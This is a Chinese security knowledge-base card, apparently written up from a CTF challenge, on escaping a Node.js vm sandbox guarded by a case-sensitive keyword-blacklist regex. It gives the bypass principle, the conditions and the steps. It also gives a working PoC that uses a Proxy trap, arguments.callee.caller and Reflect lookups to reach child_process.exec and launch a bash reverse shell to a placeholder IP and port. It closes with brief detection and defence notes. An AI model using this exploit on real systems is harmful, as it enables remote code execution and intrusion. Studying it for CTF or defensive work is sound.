---
id: binary-pwn-sandbox-escape-nodejs-vm-waf-reflect-ownkeys-bypass
title: Node.js vm 逃逸绕过关键字 WAF：Process.toLowerCase/String.fromCharCode 藏 process，Reflect.get+ownKeys 替代方括号与 exec 字面量
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: nodejs-vm-escape-waf-reflect-keyword-bypass
tags:
- javascript
- nodejs
- vm
- sandbox-escape
- waf-bypass
- reflect
- ownkeys
- fromcharcode
- proxy
- child-process
- rce
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V291
  verified_at: '2026-11-08T08:23:26+08:00'
  notes: 已对照原文核对：NKCTF WAF正则(无/i)、Process.toLowerCase/String.fromCharCode拼process、Reflect.get+Reflect.ownKeys替代方括号与exec字面量、Proxy get陷阱+arguments.callee.caller取宿主函数均与原文一致；PoC中按原文意图用return global并通过Reflect取process；未本机执行。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-nodejs-vm-waf-reflect-ownkeys-bypass/
draft: false
kb_aliases:
- NKCTF 2024 全世界最简单的 ctf
- vm 沙箱逃逸 WAF 绕过
- Reflect.ownKeys 绕过黑名单
- String.fromCharCode 绕过 process
- 大小写绕过 vm WAF
- arguments.callee.caller Proxy 逃逸
---

## 一句话结论

当 vm 沙箱外层用大小写敏感正则 `/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g` 过滤用户代码时，可以用 `'Process'.toLowerCase()` 或 `String.fromCharCode(...)` 拼出 `process`，用 `Reflect.get(obj, Reflect.ownKeys(obj).find(x => x.includes('pro')))` 等反射调用替代 `obj['process']` 与关键字字面量，从而在不出现被禁字符串的情况下完成 `arguments.callee.caller` + `constructor.constructor('return global')()` 的 vm 逃逸并执行系统命令。

## 原理

- WAF 是黑名单且没有 `/i`：`process`、`exec`、`spawn`、`Buffer`、`eval`、`Function`、反斜杠、加号、`concat` 以及方括号访问 `\[.*?\]` 都被禁，但 `Process`、`PROCESS`、`'Process'.toLowerCase()` 不匹配 `process`；`String.fromCharCode(112,114,111,99,101,115,115)` 也能拼出 `process`。
- 方括号被 `\[.*?\]` 禁用，但 `Reflect.get(target, key)` 与 `Reflect.ownKeys(target).find(pred)` 不需要方括号，且可以按子串定位属性名，从而不写出 `exec`/`process` 字面量：`'pro'` 定位 `process`、`'ex'` 定位 `exec`。
- 逃逸入口用 `throw new Proxy({}, {get: function(){...}})`：应用 `catch(e){ console.log(e.message) }` 访问 `message` 时命中 Proxy 的 `get` 陷阱，陷阱在宿主调用栈中执行，`arguments.callee.caller` 拿到宿主函数。
- `caller.constructor.constructor('return global')()` 用宿主 `Function` 取宿主 global（`global` 不在黑名单）；再 `Reflect.get(global, ...find(x=>x.includes('pro')))` 取 `process`，`process.mainModule.require(String.fromCharCode(...))` 加载 `child_process`，最后 `Reflect.get(child_process, ...find(x=>x.includes('ex')))` 取 `exec` 执行命令。
- 该组合完全避开了 `process`、`exec`、`Function`、`[` `]`、`+`、`concat` 等字面量；注意 `String.fromCharCode` 的参数是数字，不需要字符串拼接。

## 触发条件

- Node.js 应用用 `vm.createContext(Object.create(null))` + `vm.runInContext(code)` 执行用户提交的代码（如 POST body 的 code 字段）。
- 外层 WAF 是正则黑名单：`/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g`，未加 `/i`，且只做字符串匹配、不做 AST 检查。
- 应用把异常对象交给 `console.log(e.message)` 或类似属性访问，使 Proxy get 陷阱能被触发。
- 沙箱脚本非严格模式（`arguments.callee.caller` 可用）。
- Node.js 为 CommonJS（`process.mainModule` 可用）。

## 利用步骤

1. 读取/推测 WAF 黑名单，确认没有 `/i` 且禁止方括号。
2. 构造 Proxy 异常：`throw new Proxy({}, { get: function(){ ... } })`，让应用的 `e.message` 访问触发 get 陷阱。
3. 在 get 陷阱里取 `arguments.callee.caller`，用 `'return global'` 的宿主 `Function` 取 global（避免 `process`、`Function` 字面量）。
4. 用 `Reflect.get(global, Reflect.ownKeys(global).find(x => x.includes('pro')))` 取 process；用 `String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)` 拼出 `child_process` 并 `require`。
5. 用 `Reflect.get(cp, Reflect.ownKeys(cp).find(x => x.includes('ex')))` 取 exec，执行反弹 shell 或 `whoami`。

## PoC

```javascript
throw new Proxy({}, {
  get: function () {
    const cc = arguments.callee.caller;
    const g = cc.constructor.constructor('return global')();
    const p = Reflect.get(g, Reflect.ownKeys(g).find(x => x.includes('pro')));
    const cp = p.mainModule.require(
      String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)
    );
    const ex = Reflect.get(cp, Reflect.ownKeys(cp).find(x => x.includes('ex')));
    return ex("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");
  }
});
```

说明：原文先用 `'Process'.toLowerCase()` 或 `String.fromCharCode(32,112,114,111,99,101,115,115)` 演示 `process` 的拼接；实际利用中用 `return global` + `Reflect.get(global, ...)` 可完全避开 `process` 字面量。

## 变体与关联

- 变体：若 WAF 加了 `/i`，可改用 Unicode 转义、`String.fromCharCode`、`Reflect.ownKeys` 子串匹配等仍能避开字面量的方式；若 WAF 检查 AST，则需要更底层的绕过。
- 变体：属性子串匹配可换成 `find(x => /pro/.test(x))`、`filter(...)[0]`（若方括号未被禁）等。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-object-create-null-callee-caller]] 是本卡所用 `arguments.callee.caller` 逃逸原语的独立说明；[[binary-pwn-sandbox-escape-nodejs-eval-char-ast-filter-with-consolelog-eval]] 是 Node.js eval 沙箱的字符+AST 过滤绕过。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]] 是原生 vm 的经典 `this.constructor.constructor` 逃逸。

## 检测与防御

- 检测：用户代码中是否出现 `Reflect.ownKeys`、`String.fromCharCode`、`toLowerCase`、`Proxy` + `arguments.callee.caller` 的组合；异常处理是否访问用户对象的属性。
- 防御：不要用正则黑名单作为沙箱边界；对代码做 AST 白名单校验并禁止反射/动态构造；使用 `isolated-vm`/独立进程隔离；不要执行用户可控 JavaScript。
